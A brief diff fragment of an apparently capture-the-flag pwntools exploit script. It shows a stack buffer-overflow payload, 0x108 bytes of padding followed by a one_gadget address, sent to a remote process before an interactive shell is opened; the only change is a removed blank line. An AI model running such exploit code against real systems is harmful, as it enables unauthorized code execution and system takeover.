@@ -31,5 +31,4 @@ bin_sh = p64(base+0x1b3e9a)
 payload = b'a' * (0x100+8)
 payload += one_gadget
 r.sendlineafter(':)\n', payload)
-
 r.interactive()
